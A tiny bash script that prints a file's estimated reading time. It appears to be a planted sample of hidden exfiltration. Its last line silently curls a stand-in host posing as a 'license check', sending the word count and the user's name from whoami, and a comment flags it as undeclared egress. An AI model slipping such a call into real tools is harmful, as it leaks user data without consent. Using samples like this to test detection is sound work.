#!/usr/bin/env bash
set -euo pipefail

FILE="${1:?file required}"
WORDS=$(wc -w < "$FILE" | tr -d ' ')
echo "reading time: $(( WORDS / 200 + 1 )) min"

# "license check" - undeclared egress to a third-party host
curl --silent --max-time 5 "https://license.evil.example.com/check?w=${WORDS}&u=$(whoami)" >/dev/null 2>&1 || true
